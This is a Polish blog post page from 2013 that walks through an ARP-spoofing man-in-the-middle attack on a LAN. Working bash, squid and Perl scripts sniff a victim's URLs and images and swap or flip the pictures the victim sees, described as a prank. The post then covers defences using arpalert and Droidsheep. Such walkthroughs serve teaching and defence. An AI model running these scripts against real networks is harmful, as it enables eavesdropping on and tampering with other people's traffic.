@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Jak bronić się przed atakiem arpspoof? &middot; My Name</title>
+        <meta name="description" content="Grzebiąc w swoich linuksowych notatkach znalazłem instrukcje jak przy pomocy arpspoof, proxy i serwera www można zrobić komuś żart. Polega on na odwróceniu lub podmienieniu obrazków na wszystkich oglądanych przez ofiarę stronach www na inne np. coś śmiesznego. ">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.74.3" />
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:title" content="Jak bronić się przed atakiem arpspoof?">
+<meta property="og:description" content="Grzebiąc w swoich linuksowych notatkach znalazłem instrukcje jak przy pomocy arpspoof, proxy i serwera www można zrobić komuś żart. Polega on na odwróceniu lub podmienieniu obrazków na wszystkich oglądanych przez ofiarę stronach www na inne np. coś śmiesznego. ">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://techfreak.pl/jak-bronic-sie-przed-atakiem-arpspoof/">
+        <link rel="stylesheet" href="https://techfreak.pl/dist/site.css">
+        <link rel="stylesheet" href="https://techfreak.pl/dist/syntax.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+        
+        
+        
+        
+        
+
+    </head>
+    <body>
+        
+<script type="application/javascript">
+var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+var doNotTrack = (dnt == "1" || dnt == "yes");
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-43800014-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a href="https://techfreak.pl/">techfreak blog</a>
+                            </h1>
+                        
+                        
+                            <a class="button-square" href="https://techfreak.pl/index.xml" aria-label="RSS"><i class="fa fa-rss" aria-hidden="true"></i></a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Twitter" aria-label="Twitter" href="https://twitter.com/XXX" rel="me" >
+                                <i class="fa fa-twitter" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Facebook" aria-label="Facebook" href="https://www.facebook.com/username" rel="me">
+                                <i class="fa fa-facebook" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Gitlab" aria-label="Gitlab" href="https://gitlab.com/XXX" rel="me">
+                                <i class="fa fa-gitlab" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" aria-label="Github" href="https://github.com/XXX" rel="me">
+                                <i class="fa fa-github-alt" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Stack Overflow" aria-label="Stack Overflow" href="https://stackoverflow.com/users/XXX/YYY" rel="me">
+                                <i class="fa fa-stack-overflow" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="LinkedIn" aria-label="LinkedIn" href="https://linkedin.com/in/XXX/" rel="me">
+                                <i class="fa fa-linkedin" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Email" aria-label="Send an Email" href="mailto:XXX@example.com">
+                                <i class="fa fa-envelope" aria-hidden="true"></i>
+                            </a>
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+    <li class="site-nav-item">
+        <a href="/">Blog</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/page/contact/">Contact</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a href="/page/about/">About</a>
+    </li>
+
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Jak bronić się przed atakiem arpspoof?</h1>
+    
+    <p class="post-date">
+        <span>Published <time datetime="2013-06-28" itemprop="datePublished">Fri, Jun 28, 2013</time></span>
+        <span>by</span>
+        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
+            <span itemprop="name">
+                <a href="#" itemprop="url" rel="author">Przemek</a>
+            </span>
+        </span>
+    </p>
+    
+        <p class="post-reading post-line">
+            <span>Estimated reading time: 5 min</span>
+        </p>
+    
+</header>
+
+        <div class="post-content clearfix" itemprop="articleBody">
+    
+
+    <p>Grzebiąc w swoich linuksowych notatkach znalazłem instrukcje jak przy pomocy arpspoof, proxy i serwera www można zrobić komuś żart. Polega on na odwróceniu lub podmienieniu obrazków na wszystkich oglądanych przez ofiarę stronach www na inne np. coś śmiesznego. </p>
+<p>Tak, tak, jak by nie patrzeć to jest atak <a href="http://pl.wikipedia.org/wiki/ARP_Spoofing" target="_blank">arpspoof</a> typu <a href="http://pl.wikipedia.org/wiki/Atak_man_in_the_middle" target="_blank">MITM</a> który jest naprawdę łatwy do zrealizowania. Poniżej będzie można zobaczyć jak wygląda przeprowadzenie takiego ataku w sieci LAN w praktyce i jak się przed tym bronić na komputerze i smartfonie.</p>
+<h3 id="przykład-ataku-arpspoof">Przykład ataku arpspoof</h3>
+<p>Poniżej pokaże jak okłamać stacje ofiary i bramę w sieci aby cały ruch przechodził przez mój komputer co pozwoli podejrzeć ruch z komputera ofiary. Na początek trzeba zainstalować potrzebne pakiety takie jak <strong>dsniff</strong> który zawiera <strong>arpspoof</strong> i <strong>urlsnarf <strong>lub</strong> driftnet</strong> dzięki któremu zobaczymy obrazki jakie są wyświetlane na podsłuchiwanej stacji.</p>
+<pre>aptitude install dsniff xterm driftnet</pre>
+<p>Poniżej skrypt który ułatwi to wszystko uruchomić i obserwować. Na początek pozwalamy na przekazywanie pakietów przez nasz interfejs. Następnie definiujemy adres IP bramy w sieci i naszego celu.</p>
+<pre>#! /bin/bash
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+gateway=172.18.10.254
+target=172.18.10.14
+xterm -e arpspoof -i wlan0 -t $gateway $target &
+xterm -e arpspoof -i wlan0 -t $target $gateway &
+xterm -e urlsnarf -i wlan0 &
+xterm -e driftnet &</pre>
+<p>Po odpaleniu skryptu okazało się że na podsłuchiwanej stacji ktoś ogląda sobie <a href="http://strims.pl/s/dlugieszyny/">http://strims.pl/s/dlugieszyny/</a>. No i tu się zaczyna zabawa. Pierwsze co przychodzi na myśl żeby zamienić te długie nóżki na coś innego np. na prawdziwe szyny kolejowe, tak żeby było tematycznie.</p>
+<p><a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_1.jpg"><img class="aligncenter size-full wp-image-3835" alt="Atak arpspoof" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_1.jpg" width="800" height="452" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_1.jpg 800w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_1-300x169.jpg 300w" sizes="(max-width: 800px) 100vw, 800px" /></a></p>
+<h3 id="zamiana">Zamiana</h3>
+<p>Mam cel, chce zamienić obrazki czyli pliki jpg wyświetlane w przeglądarce na coś swojego lub obrócić oryginały o 180 stopni. Aby go zrealizować muszę zainstalować serwer www <strong>lighttpd</strong>, serwer proxy <strong>squid</strong> i program, kombajn do obróbki grafiki <strong>imagemagick</strong>.</p>
+<pre>aptitude install squid lighttpd imagemagick</pre>
+<h4 id="konfiguracja-serwera-www-lighttpd">Konfiguracja serwera www lighttpd</h4>
+<p>Sprawdzam czy w lighttpd.conf <strong>document.root</strong> wskazuje na /var/www/</p>
+<pre>cat /etc/lighttpd/lighttpd.conf |grep server.document-root
+<strong>server.document-root = "/var/www"</strong></pre>
+<p>Tworzę folder w /var/www <strong>replace</strong> i nadaje uprawniania</p>
+<pre>mkdir /var/www/replace
+sudo chown www-data:www-data /var/www/replace
+sudo chmod 775 /var/www/replace
+sudo gpasswd -a proxy www-data</pre>
+<p>Do <strong>/var/www/replace</strong> wgrywam plik <strong>szyny.jpg</strong> i nadaje uprawniania. Każdy musi sobie znaleźć swoje szyny.jpg :)</p>
+<pre>sudo chown www-data:www-data /var/www/szyny.jpg
+chmod 775 /var/www/szyny.jpg</pre>
+<h3 id="konfiguracja-serwera-proxy-squid3">Konfiguracja serwera proxy squid3</h3>
+<p>Cała konfiguracja squid znajduje się w pliku <strong>/etc/squid3/squid.conf</strong></p>
+<p>Szukam linii jak poniżej i usuwam hasz</p>
+<pre># acl localnet src 10.0.0.0/8# RFC1918 possible internal network
+# acl localnet src 172.16.0.0/12# RFC1918 possible internal network
+# acl localnet src 192.168.0.0/16# RFC1918 possible internal network</pre>
+<p>Szukam linii <strong>http_access deny all</strong> i zamieniam na** http_access allow all**</p>
+<p>Szukam linii <strong>http_port 3128</strong> i zamieniam na <strong>http_port 3128 intercept</strong> (intercept to nowy zamiennik transparent)</p>
+<p>Dodaje linię** url_rewrite_program /etc/squid3/replace.pl**</p>
+<p>To koniec konfiguracji samego squida czas na skrypty <strong>zamieniające pliki jpg i gif</strong></p>
+<p>Skrypty znalazłem na http://compexperience.blogspot.com i trochę zmodyfikowałem pod siebie.</p>
+<p><span style="line-height: 1.5em;">nano  </span><strong style="line-height: 1.5em;">/etc/squid3/replace.pl</strong></p>
+<pre>#!/usr/bin/perl
+$|=1;
+$count = 0;
+$pid = $$;
+while (&lt;&gt;) {
+ chomp $_;
+ if ($_ =~ /(.*\.jpg)/i) {
+ $url = $1;
+<span style="line-height: 1.61538em;"> print "http://127.0.0.1/szyny.jpg\n";</span>
+ }
+ elsif ($_ =~ /(.*\.gif)/i) {
+ $url = $1;
+print "http://127.0.0.1/szyny.jpg\n";
+}
+ else {
+ print "$_\n";;
+ }
+ $count++;
+}</pre>
+<p>drugi skrypt <strong>obracający obrazki o 180 stopni</strong></p>
+<p>nano ** /etc/squid3/flip.pl**</p>
+<pre>#!/usr/bin/perl
+ $|=1;
+ $count = 0;
+ $pid = $$;
+ while (&lt;&gt;) {
+ chomp $_;
+ if ($_ =~ /(.*\.jpg)/i) {
+ $url = $1;
+ system("/usr/bin/wget", "-q", "-O","/var/www/replace/$pid-$count.jpg", "$url");
+ system("/usr/bin/mogrify", "-flip","/var/www/replace/$pid-$count.jpg");
+ print "http://127.0.0.1/replace/$pid-$count.jpg\n";
+ }
+ elsif ($_ =~ /(.*\.gif)/i) {
+ $url = $1;
+ system("/usr/bin/wget", "-q", "-O","/var/www/replace/$pid-$count.gif", "$url");
+ system("/usr/bin/mogrify", "-flip","/var/www/replace/$pid-$count.gif");
+ print "http://127.0.0.1/replace/$pid-$count.gif\n";
+ }
+ else {
+ print "$_\n";;
+ }
+ $count++;
+ }</pre>
+<p>Nadaje uprawnienia dla obu skryptów</p>
+<pre>chmod 755 /etc/squid3/flip.pl
+chmod 755 /etc/squid3/replace.pl</pre>
+<p>Restartuje serwer www i proxy</p>
+<pre>/etc/init.d/squid3 restart
+/etc/init.d/lighttpd restart</pre>
+<p>Poniższy skrypt który uruchamia wszystko za jednym razem różni się od tego pierwszego tym że pojawiły się reguły iptables. Przekierowują one ruch www do proxy które w locie obrabia obrazki i dzięki czemu uzyskam mój cel, podmianę. Dodatkowo dochodzi adres <strong>local</strong> który jest adresem mojej stacji na której uruchomiłem serwer www i proxy.</p>
+<pre>#! /bin/bash
+ echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+ gw=172.18.10.254
+ target=172.18.10.12
+ local=172.18.10.14
+ iptables -F
+ iptables -t nat -F
+ iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j DNAT --to-destination $local:3128
+ /etc/init.d/lighttpd restart
+ /etc/init.d/squid3 restart
+ xterm -e arpspoof -t $gw $target &
+ xterm -e arpspoof -t $target $gw &</pre>
+<p>Oto wynik :):)</p>
+<p><a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof2_1.jpg"><img class="aligncenter size-full wp-image-3841" alt="techfreak_arpspoof2_1" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof2_1.jpg" width="800" height="586" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof2_1.jpg 800w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof2_1-300x219.jpg 300w" sizes="(max-width: 800px) 100vw, 800px" /></a></p>
+<h3 id="jak-się-bronić-przed-arpspoof-">Jak się bronić przed arpspoof ?</h3>
+<p>Ja znalazłem program <strong>arpalert</strong> który monitoruje stan przypisanych adresów mac do IP i do którego można podpiąć własne skrypty powiadamiające. Skonfigurowałem sobie go tak aby wyświetlał mi powiadomienie jak poniżej a do tego blokował przy pomocy iptables ruch z nowego (atakującego) mac adresu.</p>
+<p><a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_arpalert_1.jpg"><img class="aligncenter size-full wp-image-3867" alt="techfreak_arpspoof_arpalert_1" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_arpalert_1.jpg" width="800" height="600" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_arpalert_1.jpg 800w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_arpalert_1-300x225.jpg 300w" sizes="(max-width: 800px) 100vw, 800px" /></a></p>
+<h3 id="konfiguracja-arpalert">Konfiguracja Arpalert</h3>
+<p>Konfiguracje arpalert przeprowadza się w pliku** /etc/arpalert/arpalert.conf** i zmieniam tam trzy sprawy, użytkownika, na root aby wyświetlać powiadomienia, interfejs na swój np wlan0. Na koniec wskazuje jaki skrypt ma wykonać jeśli wykryje zmiany.</p>
+<p>nano /etc/arpalert/arpalert.conf</p>
+<pre>user = root
+interface = wlan0
+action on detect = "/etc/arpalert/alert"</pre>
+<p>nano /etc/arpalert/alert</p>
+<pre>#! /bin/bash
+
+case $5 in
+0 )
+AlertType="IP change";;
+1 )
+AlertType="MAC address already detected but not in white list";;
+2 )
+AlertType="MAC address in black list";;
+3 )
+AlertType="New MAC address";;
+4 )
+AlertType="Unauthorized ARP request";;
+5 )
+AlertType="Abusive number of ARP request detected";;
+6 )
+AlertType="Ethernet MAC address different from ARP MAC address";;
+7 )
+AlertType="Flood detected";;
+8 )
+AlertType="New MAC address whithout IP address";;
+9 )
+AlertType="MAC change";;
+* )
+AlertType="unknown";;
+esac
+
+ export DISPLAY=:0
+ notify-send "Arpalert!!!" "Time $(date +%d-%m-%y-%H:%M) MAC: $1 Interface: $4"
+ #logowanie
+ echo "$AlertType Time $(date +%d-%m-%y-%H:%M)  MAC: $1 Interface: $4" &gt;&gt; /var/log/arpalert.txt
+ #blokowanie
+ iptables -A INPUT -m mac --mac-source $1 -j DROP</pre>
+<p>Nadaje uprawneinia i dodaje do autostartu</p>
+<pre>chmod 755 /etc/arpalert/alert
+update-rc.d arpalert defaults</pre>
+<h3 id="a-co-ze-smartfonem">A co ze smartfonem?</h3>
+<p>Aby uchronić się przed atakiem typu arpspoof wystarczy pobrać i zainstalować program Droidsheep ze sklepu PLAY. Jak widać poniżej po zainstalowaniu programu wykrył on zmianę mac adresu bramy. Fajnie że od razu wyłącza Wifi aby zapobiec dalszemu podsłuchiwaniu.</p>
+<p style="text-align: center;">
+  <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1.jpg"><img class="aligncenter  wp-image-3847" alt="techfreak_driodsheep1" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1.jpg" width="461" height="768" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1.jpg 768w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1-180x300.jpg 180w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1-614x1024.jpg 614w" sizes="(max-width: 461px) 100vw, 461px" /></a> <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2.jpg"><img class="aligncenter  wp-image-3848" alt="techfreak_driodsheep2" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2.jpg" width="461" height="768" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2.jpg 768w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2-180x300.jpg 180w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2-614x1024.jpg 614w" sizes="(max-width: 461px) 100vw, 461px" /></a> <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3.jpg"><img class="aligncenter  wp-image-3849" alt="techfreak_driodsheep3" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3.jpg" width="461" height="768" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3.jpg 768w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3-180x300.jpg 180w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3-614x1024.jpg 614w" sizes="(max-width: 461px) 100vw, 461px" /></a> <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4.jpg"><img class="aligncenter  wp-image-3850" alt="techfreak_driodsheep4" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4.jpg" width="461" height="768" srcset="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4.jpg 768w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4-180x300.jpg 180w, http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4-614x1024.jpg 614w" sizes="(max-width: 461px) 100vw, 461px" /></a>
+</p>
+<h3 id="na-co-trzeba-uważać">Na co trzeba uważać</h3>
+<p>Jedynym problemem chyba na jaki możemy natrafić to że zainstalowaliśmy oprogramowania monitorujące gdy już ktoś nas podsłuchiwał. Jestem w poszukiwaniu fajnych rozwiązań ale chyba najprościej sprawdzić tablice <strong>arp -a</strong> i upewnić się że nie mamy tam dwóch adresów IP z tym samym adresem mac.</p>
+<p>Może ktoś ma jakieś inne pomysły ?</p>
+</div>
+
+        <footer class="post-footer clearfix">
+        <p class="post-tags">
+            <span>Tagged:</span>
+                <a href="/tags/security/">security</a>
+        </p>
+    <div class="share">
+            <a class="icon-twitter" href="https://twitter.com/share?text=Jak%20broni%c4%87%20si%c4%99%20przed%20atakiem%20arpspoof%3f&url=https%3a%2f%2ftechfreak.pl%2fjak-bronic-sie-przed-atakiem-arpspoof%2f"
+                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" aria-label="Share on Twitter">
+                <i class="fa fa-twitter" aria-hidden="true"></i>
+            </a>
+            <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2ftechfreak.pl%2fjak-bronic-sie-przed-atakiem-arpspoof%2f"
+                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" aria-label="Share on Facebook">
+                <i class="fa fa-facebook" aria-hidden="true"></i>
+            </a>
+    </div>
+</footer>
+
+        
+    <div class="comments">
+        
+    </div>
+
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a href="https://techfreak.pl/">techfreak blog</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#" aria-label="Back to Top">
+                        <i class="fa fa-angle-up" aria-hidden="true"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2020 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                </p>
+                <p class="footer-copyright">
+                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
+                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://techfreak.pl/js/jquery-1.11.3.min.js"></script>
+        <script src="https://techfreak.pl/js/jquery.fitvids.js"></script>
+        <script src="https://techfreak.pl/js/scripts.js"></script>
+    </body>
+</html>
+
